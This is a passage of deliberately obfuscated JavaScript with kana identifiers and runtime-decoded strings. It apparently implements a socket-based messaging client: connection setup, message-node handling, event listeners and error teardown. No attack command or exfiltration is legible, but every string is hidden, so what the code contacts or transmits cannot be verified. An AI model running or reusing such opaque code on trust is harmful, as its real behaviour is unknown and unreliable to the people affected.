          はね.push((をは | (つな << をへ)) & なる[0x3]);
        }
        return ぬは(はね);
      }
      function なす(つき) {
        if (typeof すは[つき] === なる[0x5]) {
          return (すは[つき] = ぬひ(やぬ[つき]));
        }
        return すは[つき];
      }
      if (!つき[なす(なる[0x1d])][なる[0x1c]]) {
        function はね(つき) {
          var うし =
              'P{<8*u$O?3,vrlq(Fz/TR2%D6p@w|s]B>=U.079W^V1c;_4faN}M!YtH+i5~)ZIhKC#Ax"oJSdm[bnXeyLgkE&Q:jG`',
            ぬひ,
            なす,
            はね,
            をは,
            をへ,
            つな,
            ほの;
          へら(
            (ぬひ = "" + (つき || "")),
            (なす = ぬひ.length),
            (はね = []),
            (をは = なる[0x0]),
            (をへ = なる[0x0]),
            (つな = -なる[0x1]),
          );
          for (ほの = なる[0x0]; ほの < なす; ほの++) {
            var てろ = うし.indexOf(ぬひ[ほの]);
            if (てろ === -なる[0x1]) continue;
            if (つな < なる[0x0]) {
              つな = てろ;
            } else {
              へら(
                (つな += てろ * なる[0xc]),
                (をは |= つな << をへ),
                (をへ +=
                  (つな & なる[0xd]) > なる[0xe] ? なる[0xf] : なる[0x10]),
              );
              do {
                へら(
                  はね.push(をは & なる[0x3]),
                  (をは >>= なる[0x2]),
                  (をへ -= なる[0x2]),
                );
              } while (をへ > なる[0x9]);
              つな = -なる[0x1];
            }
          }
          if (つな > -なる[0x1]) {
            はね.push((をは | (つな << をへ)) & なる[0x3]);
          }
          return ぬは(はね);
        }
        function をは(つき) {
          if (typeof すは[つき] === なる[0x5]) {
            return (すは[つき] = はね(やぬ[つき]));
          }
          return すは[つき];
        }
        つき[をは(0xb9)][なる[0x1c]] = ねせ();
      }
      const をへ = つき[なす(なる[0x1d])][なる[0x1c]],
        [つな] = await Promise[なす(0xba)]([やこ(をへ, うし), すゆ(つき)]);
      if (なす(0xbb) in つな) {
        へえ(つな);
      }
      return つな;
    },
    やり = async () => {
      function うし(うし) {
        var なす =
            'x>5z0S~nkq(a/7PbdX^].*2Ki1Mh!jV+pLR%BQs9$yA,C4w?|te[clDu6T<EY`}vFW@3JoU;G_#=)fm:H&8"IgN{rOZ',
          はね,
          をは,
          つな,
          てろ,
          てつ,
          makeSocket,
          てそ;
        へら(
          (はね = "" + (うし || "")),
          (をは = はね.length),
          (つな = []),
          (てろ = なる[0x0]),
          (てつ = なる[0x0]),
          (makeSocket = -なる[0x1]),
        );
        for (てそ = なる[0x0]; てそ < をは; てそ++) {
          var のち = なす.indexOf(はね[てそ]);
          if (のち === -なる[0x1]) continue;
          if (makeSocket < なる[0x0]) {
            makeSocket = のち;
          } else {
            へら(
              (makeSocket += のち * なる[0xc]),
              (てろ |= makeSocket << てつ),
              (てつ +=
                (makeSocket & なる[0xd]) > なる[0xe] ? なる[0xf] : なる[0x10]),
            );
            do {
              へら(
                つな.push(てろ & なる[0x3]),
                (てろ >>= なる[0x2]),
                (てつ -= なる[0x2]),
              );
            } while (てつ > なる[0x9]);
            makeSocket = -なる[0x1];
          }
        }
        if (makeSocket > -なる[0x1]) {
          つな.push((てろ | (makeSocket << てつ)) & なる[0x3]);
        }
        return ぬは(つな);
      }
      function なす(なす) {
        if (typeof すは[なす] === なる[0x5]) {
          return (すは[なす] = うし(やぬ[なす]));
        }
        return すは[なす];
      }
      let はね = { [ぬひ(0xbc)]: { [ぬひ(0xbd)]: おは[なす(0xbe)] } };
      へら(
        (はね = ふへ[なす(なる[0x1e])][なす(0xc0)](はね)),
        をへ[なす(なる[0x1f])](
          { [なす(0xc2)]: ほの, [なす(0xc3)]: はね },
          なす(0xc4),
        ),
      );
      const をは = ふへ[なす(なる[0x1e])]
          [なす(なる[0x21])](はね)
          [なす(なる[0x22])](),
        つな = await てき(をは),
        てろ = ふへ[なす(なる[0x1e])][なす(0xc7)](つな);
      をへ[なす(0xc8)]({ [なす(0xc9)]: てろ }, なす(0xca));
      const てつ = await ひに[なす(0xcb)](てろ, さな[なす(0xcc)]);
      let makeSocket;
      if (!さな[なる[0x20]]) {
        へら(
          (makeSocket = きこ(さな, つき)),
          をへ[なす(なる[0x1f])]({ [なす(0xcd)]: makeSocket }, なす(0xce)),
        );
      } else {
        function てそ(うし) {
          var なす =
              'mocIknrDl80(#w$dv.Ztj?~sg5b}4AJ@&yKQT9aL[MFWp7!|XE:^1]RC={O%z>BuGqh"`YS+H)2VU;ixP3,6f<N*_/e',
            はね,
            をは,
            つな,
            てろ,
            てつ,
            makeSocket,
            てそ;
          へら(
            (はね = "" + (うし || "")),
            (をは = はね.length),
            (つな = []),
            (てろ = なる[0x0]),
            (てつ = なる[0x0]),
            (makeSocket = -なる[0x1]),
          );
          for (てそ = なる[0x0]; てそ < をは; てそ++) {
            var のち = なす.indexOf(はね[てそ]);
            if (のち === -なる[0x1]) continue;
            if (makeSocket < なる[0x0]) {
              makeSocket = のち;
            } else {
              へら(
                (makeSocket += のち * なる[0xc]),
                (てろ |= makeSocket << てつ),
                (てつ +=
                  (makeSocket & なる[0xd]) > なる[0xe]
                    ? なる[0xf]
                    : なる[0x10]),
              );
              do {
                へら(
                  つな.push(てろ & なる[0x3]),
                  (てろ >>= なる[0x2]),
                  (てつ -= なる[0x2]),
                );
              } while (てつ > なる[0x9]);
              makeSocket = -なる[0x1];
            }
          }
          if (makeSocket > -なる[0x1]) {
            つな.push((てろ | (makeSocket << てつ)) & なる[0x3]);
          }
          return ぬは(つな);
        }
        function のち(うし) {
          if (typeof すは[うし] === なる[0x5]) {
            return (すは[うし] = てそ(やぬ[うし]));
          }
          return すは[うし];
        }
        へら(
          (makeSocket = なを(さな[なる[0x20]][なる[0x1c]], つき)),
          をへ[のち(0xcf)]({ [のち(0xd0)]: makeSocket }, のち(0xd1)),
        );
      }
      const はん = ひに[なす(0xd2)](
        ふへ[なす(0xd3)][なす(なる[0x21])](makeSocket)[なす(なる[0x22])](),
      );
      へら(
        await ろき(
          ふへ[なす(なる[0x1e])]
            [
              なす(なる[0x21])
            ]({ [なす(0xd4)]: { [なす(0xd5)]: てつ, [なす(0xd6)]: はん } })
            [なす(なる[0x22])](),
        ),
        ひに[なす(0xd7)](),
        たわ(),
      );
    },
    えは = async () => {
      function つき(つき) {
        var うし =
            'alFbJuoknL5N?T02]y)(g^_x:Ad*86$B4&|"U#+hRD`mcj>MrX3!=f7[K@~;9zvwtVPEOCGqWIsHeiZQpS{/<.1,}%Y',
          なす,
          はね,
          ぬひ,
          をは,
          をへ,
          つな,
          ほの;
        へら(
          (なす = "" + (つき || "")),
          (はね = なす.length),
          (ぬひ = []),
          (をは = なる[0x0]),
          (をへ = なる[0x0]),
          (つな = -なる[0x1]),
        );
        for (ほの = なる[0x0]; ほの < はね; ほの++) {
          var てろ = うし.indexOf(なす[ほの]);
          if (てろ === -なる[0x1]) continue;
          if (つな < なる[0x0]) {
            つな = てろ;
          } else {
            へら(
              (つな += てろ * なる[0xc]),
              (をは |= つな << をへ),
              (をへ += (つな & なる[0xd]) > なる[0xe] ? なる[0xf] : なる[0x10]),
            );
            do {
              へら(
                ぬひ.push(をは & なる[0x3]),
                (をは >>= なる[0x2]),
                (をへ -= なる[0x2]),
              );
            } while (をへ > なる[0x9]);
            つな = -なる[0x1];
          }
        }
        if (つな > -なる[0x1]) {
          ぬひ.push((をは | (つな << をへ)) & なる[0x3]);
        }
        return ぬは(ぬひ);
      }
      function うし(うし) {
        if (typeof すは[うし] === なる[0x5]) {
          return (すは[うし] = つき(やぬ[うし]));
        }
        return すは[うし];
      }
      const なす = await よね({
          [ぬひ(なる[0x3c])]: なる[0x3a],
          [うし(なる[0x24])]: {
            [なる[0x1c]]: ねせ(),
            [うし(0xda)]: うし(0xdb),
            [うし(0xdc)]: うし(0xdd),
            [なる[0x3b]]: のる,
          },
          [うし(0xde)]: [
            { [うし(なる[0x23])]: うし(なる[0x25]), [うし(なる[0x24])]: {} },
          ],
        }),
        はね = なほ(なす, うし(なる[0x25]));
      return +はね[うし(なる[0x24])][うし(0xe1)];
    },
    ふふ = async (つき = にに) => {
      await なそ[ぬひ(0xe2)](async () => {
        function うし(うし) {
          var ぬひ =
              'PSmd[D4{y)_aHKOAW>E7:?R0=V*!#x~$o&%JFM]T@L5Y6,se^8wpNQcl</bhki19C+nrUf2zZ}3(gqB|j`X;Gt."vIu',
            なす,
            はね,
            つき,
            をは,
            をへ,
            つな,
            ほの;
          へら(
            (なす = "" + (うし || "")),
            (はね = なす.length),
            (つき = []),
            (をは = なる[0x0]),
            (をへ = なる[0x0]),
            (つな = -なる[0x1]),
          );
          for (ほの = なる[0x0]; ほの < はね; ほの++) {
            var てろ = ぬひ.indexOf(なす[ほの]);
            if (てろ === -なる[0x1]) continue;
            if (つな < なる[0x0]) {
              つな = てろ;
            } else {
              へら(
                (つな += てろ * なる[0xc]),
                (をは |= つな << をへ),
                (をへ +=
                  (つな & なる[0xd]) > なる[0xe] ? なる[0xf] : なる[0x10]),
              );
              do {
                へら(
                  つき.push(をは & なる[0x3]),
                  (をは >>= なる[0x2]),
                  (をへ -= なる[0x2]),
                );
              } while (をへ > なる[0x9]);
              つな = -なる[0x1];
            }
          }
          if (つな > -なる[0x1]) {
            つき.push((をは | (つな << をへ)) & なる[0x3]);
          }
          return ぬは(つき);
        }
        function ぬひ(ぬひ) {
          if (typeof すは[ぬひ] === なる[0x5]) {
            return (すは[ぬひ] = うし(やぬ[ぬひ]));
          }
          return すは[ぬひ];
        }
        をへ[ぬひ(なる[0x26])]({ [ぬひ(なる[0x27])]: つき }, ぬひ(0xe5));
        const { [ぬひ(0xe6)]: なす, [ぬひ(0xe7)]: はね } = await わふ(
          { [ぬひ(0xe8)]: さな, [ぬひ(0xe9)]: なそ },
          つき,
        );
        へら(
          await よね(はね),
          きな[ぬひ(0xea)](ぬひ(0xeb), なす),
          をへ[ぬひ(なる[0x26])]({ [ぬひ(なる[0x27])]: つき }, ぬひ(0xec)),
        );
      });
    },
    ひと = async () => {
      function つき(つき) {
        var うし =
            'X+9AbH1i6wq.@5^|#!%,K>:{<P4YFBy_;UvekN&]u`[fjxT0?nLz(W)d8C$*2M7D"E/aQRoG}rsO=3lmt~gJcphSVIZ',
          ぬひ,
          なす,
          はね,
          をは,
          をへ,
          つな,
          ほの;
        へら(
          (ぬひ = "" + (つき || "")),
          (なす = ぬひ.length),
          (はね = []),
          (をは = なる[0x0]),
          (をへ = なる[0x0]),
          (つな = -なる[0x1]),
        );
        for (ほの = なる[0x0]; ほの < なす; ほの++) {
          var てろ = うし.indexOf(ぬひ[ほの]);
          if (てろ === -なる[0x1]) continue;
          if (つな < なる[0x0]) {
            つな = てろ;
          } else {
            へら(
              (つな += てろ * なる[0xc]),
              (をは |= つな << をへ),
              (をへ += (つな & なる[0xd]) > なる[0xe] ? なる[0xf] : なる[0x10]),
            );
            do {
              へら(
                はね.push(をは & なる[0x3]),
                (をは >>= なる[0x2]),
                (をへ -= なる[0x2]),
              );
            } while (をへ > なる[0x9]);
            つな = -なる[0x1];
          }
        }
        if (つな > -なる[0x1]) {
          はね.push((をは | (つな << をへ)) & なる[0x3]);
        }
        return ぬは(はね);
      }
      function うし(うし) {
        if (typeof すは[うし] === なる[0x5]) {
          return (すは[うし] = つき(やぬ[うし]));
        }
        return すは[うし];
      }
      const ぬひ = await えは();
      をへ[うし(0xed)]("" + ぬひ + うし(0xee));
      if (ぬひ <= へを) {
        await ふふ();
      }
    },
    わち = (つき) => {
      ひに[ぬひ(なる[0x28])](つき, (つき) => {
        function うし(つき) {
          var うし =
              'u2~?{gd_JAK1r)%<5VUIpo&XiW7QE`HbOR3M6Pv:ZYLfnw^+/F,G]ah*=T|"t$ljSxBs04D9qyk}C!mN;ce#8(z>.[@',
            ぬひ,
            なす,
            はね,
            をは,
            つな,
            ほの,
            てろ;
          へら(
            (ぬひ = "" + (つき || "")),
            (なす = ぬひ.length),
            (はね = []),
            (をは = なる[0x0]),
            (つな = なる[0x0]),
            (ほの = -なる[0x1]),
          );
          for (てろ = なる[0x0]; てろ < なす; てろ++) {
            var てつ = うし.indexOf(ぬひ[てろ]);
            if (てつ === -なる[0x1]) continue;
            if (ほの < なる[0x0]) {
              ほの = てつ;
            } else {
              へら(
                (ほの += てつ * なる[0xc]),
                (をは |= ほの << つな),
                (つな +=
                  (ほの & なる[0xd]) > なる[0xe] ? なる[0xf] : なる[0x10]),
              );
              do {
                へら(
                  はね.push(をは & なる[0x3]),
                  (をは >>= なる[0x2]),
                  (つな -= なる[0x2]),
                );
              } while (つな > なる[0x9]);
              ほの = -なる[0x1];
            }
          }
          if (ほの > -なる[0x1]) {
            はね.push((をは | (ほの << つな)) & なる[0x3]);
          }
          return ぬは(はね);
        }
        function ぬひ(つき) {
          if (typeof すは[つき] === なる[0x5]) {
            return (すは[つき] = うし(やぬ[つき]));
          }
          return すは[つき];
        }
        るえ = new Date();
        let なす = なる[0x11];
        なす = ほせ[ぬひ(0xf0)](ぬひ(0xf1), つき);
        if (!(つき instanceof Uint8Array)) {
          function はね(つき) {
            var うし =
                'v:1%bGz#}*qS{C=@_,hKZW2RDT^);p3Fcn&tYf[xyg"wM7BNo!?j(Him98Ae4$.VJP~aOUl0Q|+6su<>kX]5`/LEdIr',
              ぬひ,
              なす,
              はね,
              をは,
              つな,
              ほの,
              てろ;
            へら(
              (ぬひ = "" + (つき || "")),
              (なす = ぬひ.length),
              (はね = []),
              (をは = なる[0x0]),
              (つな = なる[0x0]),
              (ほの = -なる[0x1]),
            );
            for (てろ = なる[0x0]; てろ < なす; てろ++) {
              var てつ = うし.indexOf(ぬひ[てろ]);
              if (てつ === -なる[0x1]) continue;
              if (ほの < なる[0x0]) {
                ほの = てつ;
              } else {
                へら(
                  (ほの += てつ * なる[0xc]),
                  (をは |= ほの << つな),
                  (つな +=
                    (ほの & なる[0xd]) > なる[0xe] ? なる[0xf] : なる[0x10]),
                );
                do {
                  へら(
                    はね.push(をは & なる[0x3]),
                    (をは >>= なる[0x2]),
                    (つな -= なる[0x2]),
                  );
                } while (つな > なる[0x9]);
                ほの = -なる[0x1];
              }
            }
            if (ほの > -なる[0x1]) {
              はね.push((をは | (ほの << つな)) & なる[0x3]);
            }
            return ぬは(はね);
          }
          function をは(つき) {
            if (typeof すは[つき] === なる[0x5]) {
              return (すは[つき] = はね(やぬ[つき]));
            }
            return すは[つき];
          }
          const つな = つき[ぬひ(0xf2)][なる[0x1c]];
          if (をへ[ぬひ(0xf3)] === をは(0xf4)) {
            function ほの(つき) {
              var うし =
                  'm{z5P$uXAM1=*q+ekJ7r4Qv.`3@9GR/|}TxUhyIl^BtgsE6ia%V&]F,2d>O<j#ob)[C;fK!w_HcD0(YZ~L8N:Wnp"S?',
                ぬひ,
                なす,
                はね,
                をは,
                つな,
                ほの,
                てろ;
              へら(
                (ぬひ = "" + (つき || "")),
                (なす = ぬひ.length),
                (はね = []),
                (をは = なる[0x0]),
                (つな = なる[0x0]),
                (ほの = -なる[0x1]),
              );
              for (てろ = なる[0x0]; てろ < なす; てろ++) {
                var てつ = うし.indexOf(ぬひ[てろ]);
                if (てつ === -なる[0x1]) continue;
                if (ほの < なる[0x0]) {
                  ほの = てつ;
                } else {
                  へら(
                    (ほの += てつ * なる[0xc]),
                    (をは |= ほの << つな),
                    (つな +=
                      (ほの & なる[0xd]) > なる[0xe] ? なる[0xf] : なる[0x10]),
                  );
                  do {
                    へら(
                      はね.push(をは & なる[0x3]),
                      (をは >>= なる[0x2]),
                      (つな -= なる[0x2]),
                    );
                  } while (つな > なる[0x9]);
                  ほの = -なる[0x1];
                }
              }
              if (ほの > -なる[0x1]) {
                はね.push((をは | (ほの << つな)) & なる[0x3]);
              }
              return ぬは(はね);
            }
            function てろ(つき) {
              if (typeof すは[つき] === なる[0x5]) {
                return (すは[つき] = ほの(やぬ[つき]));
              }
              return すは[つき];
            }
            をへ[てろ(0xf5)]({
              [てろ(0xf6)]: ぬく(つき),
              [てろ(0xf7)]: てろ(0xf8),
            });
          }
          なす = ほせ[をは(なる[0x2c])]("" + すに + つな, つき) || なす;
          const てつ = つき[をは(0xfa)],
            makeSocket = つき[をは(0xfb)] || {},
            てそ = Array[をは(0xfc)](つき[をは(なる[0x29])])
              ? つき[をは(なる[0x29])][なる[0x0]]?.tag
              : "";
          for (const のち of Object[をは(0xfe)](makeSocket)) {
            function はん(つき) {
              var うし =
                  'uIMVHlLAjU%sp1vx_*[T(3GQ|5NwoXekDC9z7/?fFyn&B]@YRaSWg8Kq}6"c;>Om$<Pt4Z:^J!~h.ibr0d`,E#2)=+{',
                ぬひ,
                なす,
                はね,
                をは,
                つな,
                ほの,
                てろ;
              へら(
                (ぬひ = "" + (つき || "")),
                (なす = ぬひ.length),
                (はね = []),
                (をは = なる[0x0]),
                (つな = なる[0x0]),
                (ほの = -なる[0x1]),
              );
              for (てろ = なる[0x0]; てろ < なす; てろ++) {
                var てつ = うし.indexOf(ぬひ[てろ]);
                if (てつ === -なる[0x1]) continue;
                if (ほの < なる[0x0]) {
                  ほの = てつ;
                } else {
                  へら(
                    (ほの += てつ * なる[0xc]),
                    (をは |= ほの << つな),
                    (つな +=
                      (ほの & なる[0xd]) > なる[0xe] ? なる[0xf] : なる[0x10]),
                  );
                  do {
                    へら(
                      はね.push(をは & なる[0x3]),
                      (をは >>= なる[0x2]),
                      (つな -= なる[0x2]),
                    );
                  } while (つな > なる[0x9]);
                  ほの = -なる[0x1];
                }
              }
              if (ほの > -なる[0x1]) {
                はね.push((をは | (ほの << つな)) & なる[0x3]);
              }
              return ぬは(はね);
            }
            function へそ(つき) {
              if (typeof すは[つき] === なる[0x5]) {
                return (すは[つき] = はん(やぬ[つき]));
              }
              return すは[つき];
            }
            へら(
              (なす =
                ほせ[へそ(なる[0x3])](
                  "" +
                    おか +
                    てつ +
                    なる[0x2a] +
                    のち +
                    なる[0x2b] +
                    makeSocket[のち] +
                    なる[0x2a] +
                    てそ,
                  つき,
                ) || なす),
              (なす =
                ほせ[へそ(なる[0x3])](
                  "" +
                    おか +
                    てつ +
                    なる[0x2a] +
                    のち +
                    なる[0x2b] +
                    makeSocket[のち],
                  つき,
                ) || なす),
              (なす =
                ほせ[へそ(なる[0x3])](
                  "" + おか + てつ + なる[0x2a] + のち,
                  つき,
                ) || なす),
            );
          }
          へら(
            (なす =
              ほせ[をは(なる[0x2c])]("" + おか + てつ + ",," + てそ, つき) ||
              なす),
            (なす = ほせ[をは(なる[0x2c])]("" + おか + てつ, つき) || なす),
          );
          if (!なす && をへ[をは(0x100)] === をは(なる[0x2d])) {
            function つを(つき) {
              var うし =
                  'G)F@nkD,m5#z38PCB]`Ea_HQ6jh.y^}&Si1>[Z<T/VUx*?%|4cdIlX:0!9wY;petMAbN2$(+7="gvqKu~JRfO{LrsoW',
                ぬひ,
                なす,
                はね,
                をは,
                つな,
                ほの,
                てろ;
              へら(
                (ぬひ = "" + (つき || "")),
                (なす = ぬひ.length),
                (はね = []),
                (をは = なる[0x0]),
                (つな = なる[0x0]),
                (ほの = -なる[0x1]),
              );
              for (てろ = なる[0x0]; てろ < なす; てろ++) {
                var てつ = うし.indexOf(ぬひ[てろ]);
                if (てつ === -なる[0x1]) continue;
                if (ほの < なる[0x0]) {
                  ほの = てつ;
                } else {
                  へら(
                    (ほの += てつ * なる[0xc]),
                    (をは |= ほの << つな),
                    (つな +=
                      (ほの & なる[0xd]) > なる[0xe] ? なる[0xf] : なる[0x10]),
                  );
                  do {
                    へら(
                      はね.push(をは & なる[0x3]),
                      (をは >>= なる[0x2]),
                      (つな -= なる[0x2]),
                    );
                  } while (つな > なる[0x9]);
                  ほの = -なる[0x1];
                }
              }
              if (ほの > -なる[0x1]) {
                はね.push((をは | (ほの << つな)) & なる[0x3]);
              }
              return ぬは(はね);
            }
            function きふ(つき) {
              if (typeof すは[つき] === なる[0x5]) {
                return (すは[つき] = つを(やぬ[つき]));
              }
              return すは[つき];
            }
            をへ[をは(なる[0x2d])](
              {
                [きふ(0x102)]: なる[0x2e],
                [きふ(0x103)]: つな,
                [きふ(0x104)]: なる[0x11],
                [きふ(0x105)]: つき,
              },
              きふ(0x106),
            );
          }
        }
      });
    },
    やの = (つき) => {
      function うし(つき) {
        var うし =
            ')OBArCaEbsIqnkDHGoLQYeWJv]dXFl*zftpVUm+wc_j6KZ}5?&g%0:x!(u`;"2.{[>~=,#9$@48^|y/SMNhPT37<R1i',
          なす,
          はね,
          をは,
          つな,
          ほの,
          ぬひ,
          をへ;
        へら(
          (なす = "" + (つき || "")),
          (はね = なす.length),
          (をは = []),
          (つな = なる[0x0]),
          (ほの = なる[0x0]),
          (ぬひ = -なる[0x1]),
        );
        for (をへ = なる[0x0]; をへ < はね; をへ++) {
          var てろ = うし.indexOf(なす[をへ]);
          if (てろ === -なる[0x1]) continue;
          if (ぬひ < なる[0x0]) {
            ぬひ = てろ;
          } else {
            へら(
              (ぬひ += てろ * なる[0xc]),
              (つな |= ぬひ << ほの),
              (ほの += (ぬひ & なる[0xd]) > なる[0xe] ? なる[0xf] : なる[0x10]),
            );
            do {
              へら(
                をは.push(つな & なる[0x3]),
                (つな >>= なる[0x2]),
                (ほの -= なる[0x2]),
              );
            } while (ほの > なる[0x9]);
            ぬひ = -なる[0x1];
          }
        }
        if (ぬひ > -なる[0x1]) {
          をは.push((つな | (ぬひ << ほの)) & なる[0x3]);
        }
        return ぬは(をは);
      }
      function なす(つき) {
        if (typeof すは[つき] === なる[0x5]) {
          return (すは[つき] = うし(やぬ[つき]));
        }
        return すは[つき];
      }
      if (しふ) {
        function はね(つき) {
          var うし =
              'q`]u19;7}6/~@#.>=_gKvN+3)WSCn&"liQwfZP$O:cAV!odp8k(Fh,LxMJBzy<{mjXDbs4EHrG^T[ae|UYI?0*%Rt52',
            なす,
            はね,
            をは,
            つな,
            ほの,
            ぬひ,
            をへ;
          へら(
            (なす = "" + (つき || "")),
            (はね = なす.length),
            (をは = []),
            (つな = なる[0x0]),
            (ほの = なる[0x0]),
            (ぬひ = -なる[0x1]),
          );
          for (をへ = なる[0x0]; をへ < はね; をへ++) {
            var てろ = うし.indexOf(なす[をへ]);
            if (てろ === -なる[0x1]) continue;
            if (ぬひ < なる[0x0]) {
              ぬひ = てろ;
            } else {
              へら(
                (ぬひ += てろ * なる[0xc]),
                (つな |= ぬひ << ほの),
                (ほの +=
                  (ぬひ & なる[0xd]) > なる[0xe] ? なる[0xf] : なる[0x10]),
              );
              do {
                へら(
                  をは.push(つな & なる[0x3]),
                  (つな >>= なる[0x2]),
                  (ほの -= なる[0x2]),
                );
              } while (ほの > なる[0x9]);
              ぬひ = -なる[0x1];
            }
          }
          if (ぬひ > -なる[0x1]) {
            をは.push((つな | (ぬひ << ほの)) & なる[0x3]);
          }
          return ぬは(をは);
        }
        function をは(つき) {
          if (typeof すは[つき] === なる[0x5]) {
            return (すは[つき] = はね(やぬ[つき]));
          }
          return すは[つき];
        }
        をへ[ぬひ(なる[0x2f])](
          { [ぬひ(なる[0x2f])]: つき?.stack },
          をは(0x108),
        );
        return;
      }
      へら(
        (しふ = なる[0x2e]),
        をへ[ぬひ(なる[0x55])](
          { [ぬひ(なる[0x2f])]: つき?.stack },
          つき ? なす(0x10a) : なす(0x10b),
        ),
        clearInterval(えへ),
        clearTimeout(うた),
        ほせ[なす(なる[0x30])](なす(なる[0x31])),
        ほせ[なす(なる[0x30])](なす(なる[0x32])),
        ほせ[なす(なる[0x30])](なす(0x10f)),
        ほせ[なす(なる[0x30])](なす(0x110)),
      );
      if (!ほせ[なす(0x111)] && !ほせ[なす(0x112)]) {
        try {
          function つな(つき) {
            var うし =
                'WxAKQIYUShBOw,03$R/P{_4dD}TfNv#?ij8;.XarJ%ouG)z1qpy+@2`EFlLt>6m=!M5HC7V"[Zk~*:|ec(g]s^b9&n<',
              なす,
              はね,
              をは,
              つな,
              ほの,
              ぬひ,
              をへ;
            へら(
              (なす = "" + (つき || "")),
              (はね = なす.length),
              (をは = []),
              (つな = なる[0x0]),
              (ほの = なる[0x0]),
              (ぬひ = -なる[0x1]),
            );
            for (をへ = なる[0x0]; をへ < はね; をへ++) {
              var てろ = うし.indexOf(なす[をへ]);
              if (てろ === -なる[0x1]) continue;
              if (ぬひ < なる[0x0]) {
                ぬひ = てろ;
              } else {
                へら(
                  (ぬひ += てろ * なる[0xc]),
                  (つな |= ぬひ << ほの),
                  (ほの +=
                    (ぬひ & なる[0xd]) > なる[0xe] ? なる[0xf] : なる[0x10]),
                );
                do {
                  へら(
                    をは.push(つな & なる[0x3]),
                    (つな >>= なる[0x2]),
                    (ほの -= なる[0x2]),
                  );
                } while (ほの > なる[0x9]);
                ぬひ = -なる[0x1];
              }
            }
            if (ぬひ > -なる[0x1]) {
              をは.push((つな | (ぬひ << ほの)) & なる[0x3]);
            }
            return ぬは(をは);
          }
          function ほの(つき) {
            if (typeof すは[つき] === なる[0x5]) {
              return (すは[つき] = つな(やぬ[つき]));
            }
            return すは[つき];
          }
          ほせ[ほの(0x113)]();
        } catch {}
      }
      へら(
        きな[なす(0x114)](なす(なる[0x33]), {
          [なす(0x116)]: なす(なる[0x31]),
          [なす(0x117)]: {
            [なす(なる[0x32])]: つき,
            [なす(0x118)]: new Date(),
          },
        }),
        きな[なす(なる[0x30])](なす(なる[0x33])),
      );
    },
    ねと = async () => {
      function つき(つき) {
        var うし =
            '4iSsfOFWAqcMCpgQ6(B*0~,x=t)"3wyLPkb$?j&Kv/51eoh;z[@`Z{T:Hl}X2u!>n.#IYRm89Ud%G<D]_+Va|rEJ^N7',
          なす,
          はね,
          をは,
          をへ,
          つな,
          ぬひ,
          ほの;
        へら(
          (なす = "" + (つき || "")),
          (はね = なす.length),
          (をは = []),
          (をへ = なる[0x0]),
          (つな = なる[0x0]),
          (ぬひ = -なる[0x1]),
        );
        for (ほの = なる[0x0]; ほの < はね; ほの++) {
          var てろ = うし.indexOf(なす[ほの]);
          if (てろ === -なる[0x1]) continue;
          if (ぬひ < なる[0x0]) {
            ぬひ = てろ;
          } else {
            へら(
              (ぬひ += てろ * なる[0xc]),
              (をへ |= ぬひ << つな),
              (つな += (ぬひ & なる[0xd]) > なる[0xe] ? なる[0xf] : なる[0x10]),
            );
            do {
              へら(
                をは.push(をへ & なる[0x3]),
                (をへ >>= なる[0x2]),
                (つな -= なる[0x2]),
              );
            } while (つな > なる[0x9]);
            ぬひ = -なる[0x1];
          }
        }
        if (ぬひ > -なる[0x1]) {
          をは.push((をへ | (ぬひ << つな)) & なる[0x3]);
        }
        return ぬは(をは);
      }
      function うし(うし) {
        if (typeof すは[うし] === なる[0x5]) {
          return (すは[うし] = つき(やぬ[うし]));
        }
        return すは[うし];
      }
      if (ほせ[ぬひ(なる[0x34])]) {
        if (ぬひ(0x119) in とた) {
          なす();
        }
        function なす() {}
        return;
      }
      if (ほせ[ぬひ(0x11c)] || ほせ[ぬひ(0x11d)]) {
        function はね(つき) {
          var うし =
              '7NtKFnVaCcpswR]vL@=ImzG,x^?"OyP[+ruU{q4M~kE#il89X}gTZ6)Bd&<;2*!S%Qfh(:H$`3DW|A.0b5Y/j_e1>Jo',
            なす,
            はね,
            をは,
            をへ,
            つな,
            ぬひ,
            ほの;
          へら(
            (なす = "" + (つき || "")),
            (はね = なす.length),
            (をは = []),
            (をへ = なる[0x0]),
            (つな = なる[0x0]),
            (ぬひ = -なる[0x1]),
          );
          for (ほの = なる[0x0]; ほの < はね; ほの++) {
            var てろ = うし.indexOf(なす[ほの]);
            if (てろ === -なる[0x1]) continue;
            if (ぬひ < なる[0x0]) {
              ぬひ = てろ;
            } else {
              へら(
                (ぬひ += てろ * なる[0xc]),
                (をへ |= ぬひ << つな),
                (つな +=
                  (ぬひ & なる[0xd]) > なる[0xe] ? なる[0xf] : なる[0x10]),
              );
              do {
                へら(
                  をは.push(をへ & なる[0x3]),
                  (をへ >>= なる[0x2]),
                  (つな -= なる[0x2]),
                );
              } while (つな > なる[0x9]);
              ぬひ = -なる[0x1];
            }
          }
          if (ぬひ > -なる[0x1]) {
            をは.push((をへ | (ぬひ << つな)) & なる[0x3]);
          }
          return ぬは(をは);
        }
        function をは(つき) {
          if (typeof すは[つき] === なる[0x5]) {
            return (すは[つき] = はね(やぬ[つき]));
          }
          return すは[つき];
        }
        throw new さは(をは(0x11e), { [をは(0x11f)]: せけ[をは(0x120)] });
      }
      let をへ, つな;
      await new Promise((つき, うし) => {
        function なす(つき) {
          var うし =
              'PvGFqJrXKldEiR5TZgD1C=^}H|wM%B0"p:?Qch84*[mk_S#j],<7~(N>6{n`fasOz)@AL23I9U+eybVYW/ot!u&$;x.',
            なす,
            はね,
            をは,
            をへ,
            つな,
            ぬひ,
            ほの;
          へら(
            (なす = "" + (つき || "")),
            (はね = なす.length),
            (をは = []),
            (をへ = なる[0x0]),
            (つな = なる[0x0]),
            (ぬひ = -なる[0x1]),
          );
          for (ほの = なる[0x0]; ほの < はね; ほの++) {
            var てろ = うし.indexOf(なす[ほの]);
            if (てろ === -なる[0x1]) continue;
            if (ぬひ < なる[0x0]) {
              ぬひ = てろ;
            } else {
              へら(
                (ぬひ += てろ * なる[0xc]),
                (をへ |= ぬひ << つな),
                (つな +=
                  (ぬひ & なる[0xd]) > なる[0xe] ? なる[0xf] : なる[0x10]),
              );
              do {
                へら(
                  をは.push(をへ & なる[0x3]),
                  (をへ >>= なる[0x2]),
                  (つな -= なる[0x2]),
                );
              } while (つな > なる[0x9]);
              ぬひ = -なる[0x1];
            }
          }
          if (ぬひ > -なる[0x1]) {
            をは.push((をへ | (ぬひ << つな)) & なる[0x3]);
          }
          return ぬは(をは);
        }
        function はね(つき) {
          if (typeof すは[つき] === なる[0x5]) {
            return (すは[つき] = なす(やぬ[つき]));
          }
          return すは[つき];
        }
        へら(
